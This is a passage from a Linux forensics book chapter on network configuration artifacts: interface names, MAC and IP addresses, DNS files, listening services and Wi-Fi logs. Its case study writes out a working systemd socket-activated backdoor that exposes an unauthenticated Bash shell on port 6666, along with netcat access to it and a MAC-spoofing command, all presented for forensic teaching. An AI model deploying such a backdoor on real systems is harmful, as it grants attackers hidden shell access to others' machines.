<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch08"><span epub:type="pagebreak" id="page_225"/><strong><span class="big">8</span><br/>IDENTIFYING NETWORK CONFIGURATION ARTIFACTS</strong></h2>&#13;
<div class="image1"><img src="Images/common01.jpg" alt="Image" width="190" height="189"/></div>&#13;
<p class="noindent">The forensic analysis of Linux systems includes examination of networking configuration and reconstruction of past network activity. This analysis can be used to understand a system breach or compromise, or abuse by local users on the machine. This chapter describes common Linux network configurations for both static systems like servers and dynamic clients like desktops and roaming laptops. The analysis includes network interfaces, assigned IP addresses, wireless networks, attached Bluetooth devices, and more. Security coverage includes examining evidence of VPNs, firewalls, and proxy settings.</p>&#13;
<p class="indent">This chapter is not about network forensics, and it does not cover network traffic capture or packet analysis. The focus remains on postmortem (“dead disk”) examination of Linux systems. However, the topics covered here should complement any independent network forensic analysis.</p>&#13;
<h3 class="h3" id="ch00lev1_39"><span epub:type="pagebreak" id="page_226"/><strong>Network Configuration Analysis</strong></h3>&#13;
<p class="noindent">Networking has always been a fundamental part of Unix, and TCP/IP protocol support played a significant role in Unix popularity on the internet. Networking is also a core function of the Linux kernel and Linux distros. Early Unix and Linux systems had a simple static network configuration that was not expected to change, at least not frequently. The configuration could be defined at installation or edited in several files.</p>&#13;
<p class="indent">Networking today is more dynamic, and Linux systems, especially mobile systems, use network management software to keep the network configuration updated. This section provides an introduction to network interfaces and addressing, followed by the software that manages network configuration. Artifacts that are of forensic interest are highlighted.</p>&#13;
<h4 class="h4" id="ch00lev2_111"><strong><em>Linux Interfaces and Addressing</em></strong></h4>&#13;
<p class="noindent">Understanding the naming of network devices and network addressing is useful in a forensic examination. This knowledge helps the investigator find corresponding references to devices and addresses in logs, configuration files, or other persistent data.</p>&#13;
<p class="indent">During a system boot, the kernel detects and initializes hardware, including network devices. As the Linux kernel finds physical network interfaces, it automatically assigns generic names (which systemd will later rename). Additional virtual interfaces may also be created and configured. Common generic names for interfaces include:</p>&#13;
<div class="bqparan">&#13;
<table>&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:80%"/>&#13;
</colgroup>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top"><span class="codestrong">eth0</span></td>&#13;
<td style="vertical-align: top">Ethernet</td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><span class="codestrong">wlan0</span></td>&#13;
<td style="vertical-align: top">Wi-Fi</td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><span class="codestrong">wwan0</span></td>&#13;
<td style="vertical-align: top">Cellular/Mobile</td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><span class="codestrong">ppp0</span></td>&#13;
<td style="vertical-align: top">Point-to-point protocol</td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><span class="codestrong">br0</span></td>&#13;
<td style="vertical-align: top">Bridge</td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><span class="codestrong">vmnet0</span></td>&#13;
<td style="vertical-align: top">Virtual machines</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
</div>&#13;
<p class="noindent">The first three examples here are physical hardware interfaces; the last three are virtual. There is a problem when a system has multiple physical interfaces of the same type. When the kernel boots, it assigns generic interface names to network devices in the order they are detected. This ordering is not always the same across reboots, and an Ethernet interface named <code>eth0</code> might be named <code>eth1</code> the next time the system boots. To solve this problem, systemd began renaming interfaces (via the <code>systemd-udevd</code> service) with a naming convention that is consistent across boots and encodes information about the device in the interface name.</p>&#13;
<p class="indent">A renamed interface begins with a descriptive prefix—for example, <code>en</code> for Ethernet, <code>wl</code> for WLAN, or <code>ww</code> for WWAN. The PCI bus is denoted with <code>p</code>, the PCI slot is denoted with <code>s</code>, and the PCI device function (if not zero) is denoted with <code>f</code>. For example, if a running machine has interfaces <code>enp0s31f6</code> <span epub:type="pagebreak" id="page_227"/>and <code>wlp2s0</code>, we know they are Ethernet (<code>en</code>) and Wi-Fi (<code>wl</code>), and we can match the PCI bus, slot, and function with the <code>lspci</code> output<sup><a id="ch08foot01" href="footnotes.xhtml#ch08foot_01">1</a></sup> like this:</p>&#13;
<pre>$ <span class="codestrong1">lspci</span>&#13;
...&#13;
00:1f.6 Ethernet controller: Intel Corporation Ethernet Connection (4) I219-LM (rev 21)&#13;
02:00.0 Network controller: Intel Corporation Wireless 8265 / 8275 (rev 78)&#13;
...</pre>&#13;
<p class="noindent">These are only some of the characters used to denote a device name. For a complete description of the systemd device names, see the systemd.net-naming-scheme(7) man page.</p>&#13;
<p class="indent">Often, this automatic renaming can lead to long and complex interface names (<code>wwp0s20f0u2i12</code>, for example); however, these names can be analyzed to understand more about the physical hardware. The renaming action can be observed in the kernel logs; for example:</p>&#13;
<pre>Feb 16 19:20:22 pc1 kernel: e1000e 0000:00:1f.6 enp0s31f6: renamed from eth0&#13;
Feb 16 19:20:23 pc1 kernel: iwlwifi 0000:02:00.0 wlp2s0: renamed from wlan0&#13;
Feb 16 19:20:23 pc1 kernel: cdc_mbim 2-2:1.12 wwp0s20f0u2i12: renamed from wwan0</pre>&#13;
<p class="noindent">Here, the Ethernet, Wi-Fi, and WWAN interfaces of a laptop have all been renamed by <code>systemd-udevd</code>. A system administrator can prevent the renaming of interfaces with a bootloader kernel flag (<code>net.ifnames=0</code>) or by using udev rules (<em>/etc/udev/rules.d/*</em>).</p>&#13;
<p class="indent">Analyzing a MAC address can provide information about the hardware or lower-layer protocols used. Physical interfaces have MAC addresses to identify the machine at the link layer of an attached network. These MAC addresses are intended to be unique for each network device, and they can be used as identifiers in an investigation. Manufacturers define MAC addresses based on address blocks allocated by the IEEE. The IEEE Organizationally Unique Identifier (OUI) database (<em><a href="https://standards.ieee.org/regauth/">https://standards.ieee.org/regauth/</a></em>) lists the MAC address blocks allocated to organizations. The Internet Assigned Numbers Authority (IANA) MAC address block (00-00-5E) lists the allocated IEEE 802 protocol numbers (<em><a href="https://www.iana.org/assignments/ethernet-numbers/ethernet-numbers.xhtml">https://www.iana.org/assignments/ethernet-numbers/ethernet-numbers.xhtml</a></em>). These are both described in RFC 7042 (<em><a href="https://tools.ietf.org/html/rfc7042/">https://tools.ietf.org/html/rfc7042/</a></em>).</p>&#13;
<p class="indent">The MAC address used will typically be found in the kernel logs when the device was first detected. A device’s kernel module logs the MAC address, and log entries may look slightly different across devices. Here are a few examples:</p>&#13;
<pre>Dec 16 09:01:21 pc1 kernel: e1000e 0000:00:19.0 eth0: (PCI Express:2.5GT/s:Width x1)&#13;
 f0:79:59:db:be:05&#13;
Dec 17 09:49:31 pc1 kernel: r8169 0000:01:00.0 eth0: RTL8168g/8111g, 00:01:2e:84:94:de,&#13;
&#13;
 <span epub:type="pagebreak" id="page_228"/>XID 4c0, IRQ 135&#13;
Dec 16 08:56:19 pc1 kernel: igb 0000:01:00.0: eth0: (PCIe:5.0Gb/s:Width x4) a0:36:9f:44:46:5c</pre>&#13;
<p class="noindent">In this example, three different kernel modules (<code>e1000e</code>, <code>r8169m</code>, and <code>igb</code>) produced kernel logs containing a MAC address.</p>&#13;
<p class="indent">The MAC address can be manually modified, randomly generated, or even made to spoof another machine. Reasons for MAC address modification may be legitimate concerns for personal privacy, deliberate anti-forensic efforts to obscure identity, or even attempts to impersonate the identity of another device on a network. MAC address randomization is a systemd feature (not used by default), and it’s documented in the systemd.link(5) man page. The modification of a MAC address might not be visible in the logs, and it may be determined from configuration files (<em>/etc/systemd/network/* .link</em>), udev rules (<em>/etc/udev/rules.d/*.rules</em>), or manually entered commands (possibly found in the shell history). The following command example manually changes a MAC address:</p>&#13;
<pre># <span class="codestrong1">ip link set eth0 address fe:ed:de:ad:be:ef</span></pre>&#13;
<p class="noindent">IP addresses (IPv4 or IPv6), routes, and other network configuration information can be statically defined in distro-specific files, dynamically configured by network managers, or manually specified with tools such as <code>ip</code> (the modern replacement for ifconfig). For more information, see the ip(8) man page.</p>&#13;
<p class="indent">In the context of forensic investigations, previously used IP and MAC addresses can be used to reconstruct past events and activity. Places to search for IP and MAC addresses on the local machine include:</p>&#13;
<ul>&#13;
<li class="noindent">Kernel logs (<code>dmesg</code>)</li>&#13;
<li class="noindent">Systemd journal and syslog</li>&#13;
<li class="noindent">Application logs</li>&#13;
<li class="noindent">Firewall logs</li>&#13;
<li class="noindent">Configuration files</li>&#13;
<li class="noindent">Cache and persistent data</li>&#13;
<li class="noindent">Other files in user XDG directories</li>&#13;
<li class="noindent">Shell history of system administrators</li>&#13;
</ul>&#13;
<p class="indent">Many places to look for MAC and IP addresses are not on the local machine, but rather on the surrounding infrastructure or remote servers. MAC addresses are visible only on a local subnet, so searching for MAC addresses will be limited to link-layer infrastructure, such as Wi-Fi access points, DHCP servers, link-layer monitoring systems (arpwatch, for example), and other local network switching infrastructure. During an ongoing incident, other machines on the same subnet may have traces of a suspect machine’s MAC address in their arp caches (mostly from broadcast packets). Remote servers will likely retain a significant amount of information regarding past IP addresses. Applications and OS components sending telemetry data or other <span epub:type="pagebreak" id="page_229"/>network traffic that contains unique identifiers may also be logged on the remote infrastructure.</p>&#13;
<p class="indent">Within an organization, CERT/SOC/Security teams may have access to further security monitoring information to investigate incidents. Within a legal jurisdiction, law enforcement agencies may be able to make requests for this information to investigate criminal activity.</p>&#13;
<h4 class="h4" id="ch00lev2_112"><strong><em>Network Managers and Distro-Specific Configuration</em></strong></h4>&#13;
<p class="noindent">Historically, each Linux distribution has managed the network configuration in its own way. On server systems, this may change in the future, as systemd provides a standard network configuration method using unit files. On client and desktop systems, the need for dynamically configured networking (roaming with Wi-Fi or mobile protocols) has increased, and network managers have become common.</p>&#13;
<p class="indent">Debian-based systems configure networking in the <em>/etc/network/interfaces</em> file. This file specifies the network configuration for each interface. An interface can be statically configured or use DHCP. IPv4 and IPv6 addresses can be specified with static routing, DNS, and more. Here’s an example taken from a <em>/etc/network/interfaces</em> file:</p>&#13;
<pre>auto eth0&#13;
iface eth0 inet static:&#13;
    address 10.0.0.2&#13;
    netmask 255.255.255.0&#13;
    gateway 10.0.0.1&#13;
    dns-domain example.com&#13;
    dns-nameservers 10.0.0.1</pre>&#13;
<p class="indent">Here, the interface is configured at boot with a static IPv4 address. The address, netmask, and default route are defined. The DNS server and search domain are configured. Files containing snippets of configuration can also be stored in the <em>/etc/network/interfaces.d/</em> directory. Other directories in <em>/etc/ network/</em> are used for pre and post scripts to be run when interfaces go up or down. See the interfaces(5) man page for more information on a Debian or Debian-based system.</p>&#13;
<p class="indent">Red Hat and SUSE use the <em>/etc/sysconfig/</em> directory to store configuration files. These files contain variables (<code>key=value</code>) and shell commands that can be included in other shell scripts or used by unit files during system boot or during system administration. The <em>/etc/sysconfig/network-scripts/</em> and <em>/etc/ sysconfig/network/</em> directories contain network configuration files. The following example shows a configuration for an <code>enp2s0</code> interface:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/sysconfig/network-scripts/ifcfg-enp2s0</span>&#13;
TYPE=Ethernet&#13;
PROXY_METHOD=none&#13;
BROWSER_ONLY=no&#13;
BOOTPROTO=dhcp&#13;
<span epub:type="pagebreak" id="page_230"/>DEFROUTE=yes&#13;
IPV4_FAILURE_FATAL=no&#13;
IPV6INIT=yes&#13;
IPV6_AUTOCONF=yes&#13;
IPV6_DEFROUTE=yes&#13;
IPV6_FAILURE_FATAL=no&#13;
IPV6_ADDR_GEN_MODE=stable-privacy&#13;
NAME=pc1&#13;
UUID=16c5fec0-594b-329e-949e-02e36b7dee59&#13;
DEVICE=enp2s0&#13;
ONBOOT=yes&#13;
AUTOCONNECT_PRIORITY=-999&#13;
IPV6_PRIVACY=no</pre>&#13;
<p class="noindent">In this example, the configuration of the <code>enp2s0</code> interface is defined. These variable-based configuration files are tool independent, and different network management tools can use the same set of configuration files. SUSE has also introduced Wicked, an alternative network configuration system using a daemon (wickedd) that monitors network interfaces and can be controlled over the D-Bus. The <em>/etc/sysconfig/</em> directory is still read and additional XML configuration files are created in the <em>/etc/wicked/</em> directory.</p>&#13;
<p class="indent">The Arch Linux project has developed a network management system called netctl, which is based on systemd. Arch does not install netctl by default, but it gives users the choice to use it or other distro-independent network managers. Netctl profiles are stored by name in the <em>/etc/netctl/</em> directory.</p>&#13;
<p class="indent">Systemd provides network management using three types of network configuration files that look similar to unit files. The configuration file typically references the network device (eth0 for example) with one of the following extensions:</p>&#13;
<div class="bqparan">&#13;
<p class="noindentin"><strong><em>.link</em></strong> Configure physical network devices; Ethernet, for example</p>&#13;
<p class="noindentin"><strong><em>.netdev</em></strong> Configure virtual network devices such as VPNs and tunnels</p>&#13;
<p class="noindentin"><strong><em>.network</em></strong> Configure the network layer (IPv4, IPv6, DHCP, and so on)</p>&#13;
</div>&#13;
<p class="noindent">The systemd-udevd daemon uses <em>.link</em> files, and the systemd-networkd daemon uses <em>.netdev</em> and <em>.network</em> files. Default network configuration files provided by the distribution or installed packages are found in the <em>/usr/lib/ systemd/network/</em> directory. System administrator custom configurations are found in the <em>/etc/systemd/network/</em> directory. Examining these directories will provide insight into how networking was configured using systemd.</p>&#13;
<p class="indent">The following is an example <em>.link</em> file:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/systemd/network/00-default.link</span>&#13;
[Match]&#13;
OriginalName=*&#13;
&#13;
<span epub:type="pagebreak" id="page_231"/>[Link]&#13;
MACAddressPolicy=random</pre>&#13;
<p class="noindent">In this case, the default link configuration is overridden so that interfaces get a randomly generated MAC address at boot.</p>&#13;
<p class="indent">Here’s an example <em>.netdev</em> file:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/systemd/network/br0.netdev</span>&#13;
[NetDev]&#13;
Name=br0&#13;
Kind=bridge</pre>&#13;
<p class="noindent">This simple <em>.netdev</em> file defines a bridge interface called <code>br0</code>. An interface can then be added to the bridge in a <em>.network</em> file, as illustrated here:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/systemd/network/eth1.network</span>&#13;
[Match]&#13;
Name=eth1&#13;
&#13;
[Network]&#13;
Address=10.0.0.35/24&#13;
Gateway=10.0.0.1</pre>&#13;
<p class="noindent">Here, a static IP address, netmask (<code>/24</code>), and default route are defined for the <code>eth1</code> interface. See the systemd.link(5), systemd.netdev(5), and systemd .network(5) man pages for more information.</p>&#13;
<p class="indent">Many Linux systems use the NetworkManager daemon to manage network configuration, especially on desktop systems. The configuration data is located in the <em>/etc/NetworkManager/</em> directory. The <em>NetworkManager.conf</em> file holds general configuration information, and the individual connections are defined by name in the <em>/etc/NetworkManager/system-connections/</em> directory. For Wi-Fi connections, these files may contain network names and passwords. See the NetworkManager(8) and NetworkManager.conf(5) man pages for more details.</p>&#13;
<h4 class="h4" id="ch00lev2_113"><strong><em>DNS Resolution</em></strong></h4>&#13;
<p class="noindent">Computer systems on the internet use the domain name system (DNS) to determine IP addresses from hostnames and hostnames from IP addresses.<sup><a id="ch08foot02" href="footnotes.xhtml#ch08foot_02">2</a></sup> This online lookup is called DNS resolution, and Linux machines implement it using a mechanism called a <em>DNS resolver</em>. Unlike IP addresses and routing, DNS resolution is not configured in the kernel, but operates entirely in userspace. The resolver functionality is built into the standard C library that uses the <em>/etc/resolv.conf</em> file to specify the local DNS configuration.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_232"/>This configuration file contains a list of DNS name server IP addresses and may also contain domain names used by the local system. The IP addresses may be IPv4 or IPv6, and refer to DNS servers run by the local network administrators, internet service providers (ISPs), or DNS providers. The following is an example <em>resolv.conf</em> file:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/resolv.conf</span>&#13;
search example.com&#13;
nameserver 10.0.0.1&#13;
nameserver 10.0.0.2</pre>&#13;
<p class="noindent">Here, the search domain is appended to simple hostnames and two name servers are specified (if the first one is down, the second one is tried). More recent resolver implementations facilitate resolution over D-Bus and local sockets.</p>&#13;
<p class="indent">You can find other options in the resolv.conf(5) man page. Also, an <em>/etc/resolv.conf.bak</em> file may exist that contains settings from previous DNS configurations. The filesystem timestamps of the <em>resolv.conf</em> file will indicate when the file was generated.</p>&#13;
<p class="indent">As roaming and mobile machines made networking more dynamic, system administrators, network managers, daemons, and other programs all wanted to make changes to the <em>resolv.conf</em> file. This was problematic because one program (or person) would sometimes undo the changes made by another, causing confusion. Today, the <em>resolv.conf</em> file is typically managed using a framework called <em>resolvconf</em> .</p>&#13;
<p class="indent">Depending on the Linux distribution, the resolvconf framework used may be openresolv or systemd’s resolvconf. The systemd-resolved daemon is configured in the <em>/etc/systemd/resolved.conf</em> file; for example:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/systemd/resolved.conf</span>&#13;
...&#13;
[Resolve]&#13;
DNS=10.0.1.1&#13;
Domains=example.com&#13;
...&#13;
# Some examples of DNS servers which may be used for DNS= and FallbackDNS=:&#13;
# Cloudflare: 1.1.1.1 1.0.0.1 2606:4700:4700::1111 2606:4700:4700::1001&#13;
# Google:     8.8.8.8 8.8.4.4 2001:4860:4860::8888 2001:4860:4860::8844&#13;
# Quad9:      9.9.9.9 2620:fe::fe&#13;
#DNS=&#13;
#FallbackDNS=1.1.1.1 9.9.9.10 8.8.8.8 2606:4700:4700::1111 2620:fe::10&#13;
2001:4860:4860::8888</pre>&#13;
<p class="indent">The systemd-resolved system manages the <em>resolv.conf</em> file based on parameters in the <em>/etc/systemd/resolved.conf</em> file, and specifies DNS servers, domains, fallback servers, and other DNS resolver configuration. The alternative openresolv framework stores its configuration in the <em>/etc/resolvconf.conf</em> file. See the resolvconf(8) man page for more details.</p>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_233"/>Some applications are able to use DNS over HTTPS (DoH) or DNS over TLS (DoT), where DNS queries are sent to a DNS provider over an encrypted connection. Many modern web browsers provide this feature, which bypasses the local DNS resolver system. Be sure to check the browser configuration for alternate DNS providers. Systemd currently supports DoT.</p>&#13;
<p class="indent">The resolver configuration files are interesting because they provide a link between a Linux system and the ISP or DNS provider. The ISP or DNS provider may have logs of DNS queries and timestamps available for investigators on request. DNS queries logged on DNS servers can provide a wealth of information about the activities of a machine, such as the following:</p>&#13;
<ul>&#13;
<li class="noindent">History of websites a user visited (including frequency of repeat visits)</li>&#13;
<li class="noindent">Email, messaging, and social media activity (which providers are used and the frequency)</li>&#13;
<li class="noindent">Usage of any applications that check for updates or send telemetry requests</li>&#13;
<li class="noindent">On server systems, reverse DNS<sup><a id="ch08foot03" href="footnotes.xhtml#ch08foot_03">3</a></sup> lookups may indicate network connections <em>to</em> the Linux system under investigation (the resolved FQDNs may be visible in the logs)</li>&#13;
<li class="noindent">Any other DNS resource records (MX, TXT, and so on) that have been queried</li>&#13;
</ul>&#13;
<p class="noindent">Within an organization, CERT/SOC/Security teams may have access to this information to investigate security incidents. Within a legal jurisdiction, law enforcement agencies may be able to make lawful requests for this information to investigate criminal activity.</p>&#13;
<p class="indent">The <em>/etc/nsswitch.conf</em> file was developed to allow multiple sources of information (databases) for users, groups, host lookups, and more. The <code>hosts:</code> entry defines how lookups are made; for example:</p>&#13;
<pre>$ <span class="codestrong1">cat /etc/nsswitch.conf</span>&#13;
...&#13;
hosts:     files dns&#13;
...</pre>&#13;
<p class="noindent">Here, that entry states that the local files (<em>/etc/hosts</em>) should be queried first, followed by DNS. This line may define conditional statements or other databases. See the nsswitch.conf(5) man page for more information.</p>&#13;
<p class="indent">The <em>/etc/hosts</em> file predates DNS and is a local table of IP-to-hostname mappings. The system will check this file first before it attempts to resolve a hostname or IP address using DNS. The <em>hosts</em> file is typically used today to configure local hostnames and define custom IP/hostname pairs. In a forensic examination, this file should be checked for any changes by the system administrator or malicious actors.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_234"/>Lastly, Avahi is the Linux implementation of Apple’s Zeroconf specification. Zeroconf (and therefore Avahi) uses multicast DNS to publish services (like file sharing, for example) on a local network. These services are discoverable by other clients on the local network. The Avahi configuration is found in <em>/etc/avahi/</em> and the avahi daemon logs activity to the journal (search for logs from avahi-daemon).</p>&#13;
<h4 class="h4" id="ch00lev2_114"><strong><em>Network Services</em></strong></h4>&#13;
<p class="noindent">Some Linux daemons listen on network interfaces for incoming service requests. At the transport layer, this is typically a listening UDP or TCP socket. UDP and TCP sockets bind to one or more interfaces and listen on a specified port number. In a forensic examination, we are interested in identifying the listening services started at boot time and possibly those started during the operation of the machine. These services may be normal legitimate services, services run by the system owner for abusive purposes, or services started by malicious actors (backdoors, for example).</p>&#13;
<p class="indent">Many network services have a daemon permanently running on the system that accepts connection requests from remote clients over the network. The configuration of these services typically includes the port and interfaces on which to listen. This configuration is specified by flags provided to the daemon program binary, a configuration file, or compiled-in defaults. Network daemon configuration files don’t have a standard syntax, but there are similarities. Here are a few common daemons and their associated configuration syntax for listening services:</p>&#13;
<pre><span class="codestrong1">/etc/mysql/mariadb.conf.d/50-server.cnf</span>&#13;
bind-address = 127.0.0.1&#13;
&#13;
<span class="codestrong1">/etc/mpd.conf</span>&#13;
bind_to_address "10.0.0.1"&#13;
&#13;
<span class="codestrong1">/etc/ssh/sshd_config</span>&#13;
Port 22&#13;
AddressFamily any&#13;
ListenAddress 0.0.0.0&#13;
ListenAddress ::&#13;
&#13;
<span class="codestrong1">/etc/apache2/ports.conf</span>&#13;
Listen 80&#13;
Listen 443&#13;
&#13;
<span class="codestrong1">/etc/cups/cupsd.conf</span>&#13;
Listen 10.0.0.1:631&#13;
&#13;
<span class="codestrong1">/etc/dnsmasq.conf</span>&#13;
interface=wlan0</pre>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_235"/>These examples show how configuration file syntax is completely different among network service daemons. However, they all specify the same things, like port numbers (possibly more than one), the address family (IPv4, IPv6, or both), or the interface on which to listen (by IP address or network device name).</p>&#13;
<p class="indent">On a running system, the <code>ss</code> tool (a modern alternative to <code>netstat</code>) can show all the listening ports together with the name of the daemon. For example, we can use <code>ss -lntup</code> to show all listening numeric TCP and UDP ports with the listener process name. But in a postmortem forensic examination of a filesystem, we have only configuration files and logs to determine what was listening. This analysis involves examining all the enabled network daemons and individually checking their configuration files for listening interfaces or IP addresses (if nothing is defined, the compiled-in defaults are used).</p>&#13;
<p class="indent">Many services will emit log messages on startup describing how they are listening on the machine:</p>&#13;
<pre>Dec 17 09:49:32 pc1 sshd[362]: Server listening on 0.0.0.0 port 22.&#13;
Dec 17 09:49:32 pc1 sshd[362]: Server listening on :: port 22.&#13;
...&#13;
pc1/10.0.0.1 2020-12-16 07:28:08 daemon.info named[16700]: listening&#13;
on IPv6 interfaces, port 53</pre>&#13;
<p class="noindent">In these examples, the secure shell daemon (<code>sshd</code>) and the Bind DNS server (<code>named</code>) both logged information about their listening configuration on startup.</p>&#13;
<p class="indent">Services bound only to localhost (127.0.0.1 or ::1) are accessible from the local machine, but not from attached networks (like the internet). This restricted listening is typically done for backend services like databases that are accessed by other local daemons, but never intended for remote machines over a network. Some incidents involve the misconfiguration of these backend services, which accidentally exposes them to the internet where they can be abused or compromised.</p>&#13;
<p class="indent">Hosts with more than one network interface are known as <em>multihomed systems</em> and typically include firewalls, proxy servers, routers, or machines with virtual interfaces from VPNs or tunnels. Client programs may have flags or configuration defining which interface (or IP) to use as the originating source. For example, the <code>ping</code> command has the <code>-I</code> flag to specify a source IP or interface for ping packets. Secure shell (SSH) clients may use the <code>-b</code> flag or <code>bindaddress</code> directive to specify the source IP on a machine with multiple interfaces.</p>&#13;
<p class="indent">In a forensic examination, these flags or configurations can be important because they indicate the source IP of established network connections, or the interface from where network traffic came. The IP address may correlate with remote logs, intrusion detection systems (IDSs), or network forensic analysis.</p>&#13;
<p class="indent">Some network services are started on demand using a network-based activation mechanism. Traditional Unix-style activation for network services <span epub:type="pagebreak" id="page_236"/>uses a daemon called inetd (or xinetd, a popular alternative) that listens on multiple incoming TCP and UDP ports and waits to start the appropriate daemon when a connection is attempted. A systemd <em>*.socket</em> file performs similar socket-based activation for daemons that are started on demand.</p>&#13;
<h5 class="h5"><strong>Case Study: Network Backdoor</strong></h5>&#13;
<p class="noindent">I’ll conclude this section with a case study of a backdoor implemented using systemd socket activation. In this example, two malicious unit files are written to a user’s systemd unit directory (<em>.config/systemd/user/</em>), providing a socket-activated backdoor shell:</p>&#13;
<pre>$ <span class="codestrong1">cat /home/sam/.config/systemd/user/backdoor.socket</span>&#13;
[Unit]&#13;
Description=Backdoor for Netcat!&#13;
&#13;
[Socket]&#13;
ListenStream=6666&#13;
Accept=yes&#13;
&#13;
[Install]&#13;
WantedBy=sockets.target</pre>&#13;
<p class="indent">If enabled, this <em>backdoor.socket</em> file listens on TCP port 6666 and starts the <em>backdoor.service</em> unit when a connection is received:</p>&#13;
<pre>$ <span class="codestrong1">cat /home/sam/.config/systemd/user/backdoor@.service</span>&#13;
[Unit]&#13;
Description=Backdoor shell!&#13;
&#13;
[Service]&#13;
Type=exec&#13;
ExecStart=/usr/bin/bash&#13;
StandardInput=socket</pre>&#13;
<p class="noindent">This <em>backdoor.service</em> file starts a Bash shell and passes input and output (<code>stdin</code> and <code>stdout</code>) to the connected network client. A remote attacker can then access the backdoor with netcat and run shell commands (using CTRL-C to disconnect):</p>&#13;
<pre>$ <span class="codestrong1">netcat pc1 6666</span>&#13;
whoami&#13;
sam&#13;
^C</pre>&#13;
<p class="noindent">When the user is logged in, the backdoor is available and shell commands can be run as that user. This backdoor is an example of unauthenticated shell access to a Linux machine using socket activation.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_237"/>Socket activated services are visible in the journal logs:</p>&#13;
<pre>Dec 18 08:50:56 pc1 systemd[439]: Listening on Backdoor for Netcat!.&#13;
...&#13;
Dec 18 11:03:06 pc1 systemd[439]: Starting Backdoor shell! (10.0.0.1:41574)...&#13;
Dec 18 11:03:06 pc1 systemd[439]: Started Backdoor shell! (10.0.0.1:41574).&#13;
...&#13;
Dec 18 11:03:15 pc1 systemd[439]: backdoor@4-10.0.0.2:6666-10.0.0.1:41574.service: Succeeded.</pre>&#13;
<p class="noindent">Here, the first log entry is a message that the listener has started and the next two entries show an incoming connection from a remote IP causing the service to start. The last entry is the termination of the connection that includes information about the TCP session (source and destination ports and IP addresses).</p>&#13;
<h3 class="h3" id="ch00lev1_40"><strong>Wireless Network Analysis</strong></h3>&#13;
<p class="noindent">The growth of wireless mobile devices and the convenience of wireless technologies have led to the implementation of wireless standards in Linux systems. The most prevalent include Wi-Fi, Bluetooth, and WWAN mobile technology. Each of these three technologies leave traces of evidence on the local system that may be of interest to forensic investigators. In addition, the wireless device or infrastructure with which the Linux machine connects may also have traces of evidence (Locard’s principle applied to wireless technologies).</p>&#13;
<h4 class="h4" id="ch00lev2_115"><strong><em>Wi-Fi Artifacts</em></strong></h4>&#13;
<p class="noindent">The 802.11x Wi-Fi standards allow client computers to connect wirelessly to access points (APs), also known as hotspots or base stations. From a forensics perspective, we are looking for various artifacts that might be found on the Linux system:</p>&#13;
<ul>&#13;
<li class="noindent">SSID (Service Set IDentifier), the name of connected Wi-Fi networks</li>&#13;
<li class="noindent">BSSID (Basic SSID), the MAC address of connected base stations</li>&#13;
<li class="noindent">Passwords to connected Wi-Fi networks</li>&#13;
<li class="noindent">If the Linux system was an AP, the SSID and password</li>&#13;
<li class="noindent">If the Linux system was an AP, which clients connected</li>&#13;
<li class="noindent">Other configuration parameters</li>&#13;
</ul>&#13;
<p class="noindent">We can find these artifacts in configuration files, logs, and other persistent cache data.</p>&#13;
<p class="indent">Computers typically connect to Wi-Fi networks using various forms of authentication and security, with WPA2 (Wi-Fi Protected Access 2) being the most popular today. Managing WPA2 under Linux requires a daemon to <span epub:type="pagebreak" id="page_238"/>monitor and manage key negotiation, authentication, and association/disassociation of the kernel’s Wi-Fi device. The wpa_supplicant daemon was originally developed for this purpose in 2003 and has been widely used since.</p>&#13;
<p class="indent">The iwd daemon was created by Intel and released in 2018 as a modern and simplified replacement for wpa_supplicant. Both of these implementations may have configuration data, logs, and cached information that can be of interest to forensic examiners.</p>&#13;
<p class="indent">The <code>wpa_supplicant</code> daemon (which is part of the software package called wpa_ supplicant or wpasupplicant) can store static configuration in <em>/etc/wpa _supplicant.conf</em>, but it is more commonly configured by a network manager dynamically over D-Bus. The daemon may log information to the system log; for example:</p>&#13;
<pre>Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: SME: Trying to authenticate with 80:ea:96:eb&#13;
:df:c2 (SSID='Free' freq=2412 MHz)&#13;
Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: Trying to associate with 80:ea:96:eb:df:c2 (&#13;
SSID='Free' freq=2412 MHz)&#13;
Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: Associated with 80:ea:96:eb:df:c2&#13;
Dec 01 10:40:30 pc1 wpa_supplicant[497]: wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0&#13;
Dec 01 10:40:31 pc1 wpa_supplicant[497]: wlan0: WPA: Key negotiation completed with 80:ea:96&#13;
:eb:df:c2 [PTK=CCMP GTK=CCMP]&#13;
Dec 01 10:40:31 pc1 wpa_supplicant[497]: wlan0: CTRL-EVENT-CONNECTED - Connection to 80:ea:&#13;
96:eb:df:c2 completed [id=0 id_str=]&#13;
...&#13;
Dec 01 10:45:56 pc1 wpa_supplicant[497]: wlan0: CTRL-EVENT-DISCONNECTED bssid=80:ea:96:eb:df&#13;
:c2 reason=3 locally_generated=1</pre>&#13;
<p class="noindent">In this example, a Linux system running <code>wpa_supplicant</code> connected to the <code>Free</code> network and disconnected a few minutes later.</p>&#13;
<p class="indent">The kernel may log certain activity related to the joining and disconnecting of Wi-Fi networks, as shown in the following example:</p>&#13;
<pre>Aug 22 13:00:58 pc1 kernel: wlan0: authenticate with 18:e8:29:a8:8b:e1&#13;
